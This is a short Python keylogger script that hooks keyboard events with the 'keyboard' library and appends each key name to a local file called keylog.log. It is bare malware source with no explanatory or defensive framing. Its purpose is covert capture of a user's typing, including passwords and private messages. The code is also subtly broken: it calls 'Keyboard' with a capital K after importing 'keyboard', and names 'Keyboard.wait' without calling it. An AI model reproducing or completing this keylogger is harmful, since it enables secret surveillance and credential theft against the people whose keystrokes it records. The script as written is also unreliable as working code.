import keyboard
logFile = "keylog.log"

def onKeyPress(event):
    with open(logFile, "a") as f:
        f.write(event.name)

Keyboard.on_press(onKeyPress)

Keyboard.wait